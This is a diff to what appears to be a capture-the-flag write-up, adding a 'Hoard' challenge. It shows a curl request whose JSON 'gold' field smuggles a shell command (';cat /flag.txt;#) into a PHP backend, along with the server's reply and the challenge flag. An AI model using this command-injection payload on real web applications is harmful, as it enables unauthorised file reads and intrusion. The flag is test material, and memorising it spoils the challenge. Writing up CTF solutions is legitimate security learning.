@@ -18,6 +18,7 @@
   - Detector-2
   - Evidence
   - Hangman-one
+  - Hoard
 
 -----------------------
 
@@ -438,8 +439,19 @@ $ /app/valuate-hoard '$data['gold']' '$data['gems']' 'data['artifacts']'
 
 - Exploiting it-:
 
+ ![image](https://github.com/user-attachments/assets/b9780e77-27d4-4c3e-9e23-aaaa46f673d0)
+
+ - Flag-:```CTF{a-dragons-hoard-is-all-he-has-dont-take-it-away}```
+
+```bash
+
+┌──(root💀lulz-PhotoAuto)-[~]
+└─# curl https://hoard-049015ac.challenges.bsidessf.net/backend.php -H "Content-Type: application/json" -d $'{"gold":"\';cat /flag.txt;#","gems":"1000","artifacts":"1000","hoardType":"artifact"}'
+{"status":"success","message":"Hoard valuation logged and valued at <tt>Usage: \/app\/valuate-hoard num1 num2 num3\nCTF{a-dragons-hoard-is-all-he-has-dont-take-it-away}\n<\/tt>"}
+```
 
 
+----------------------
 
 
 
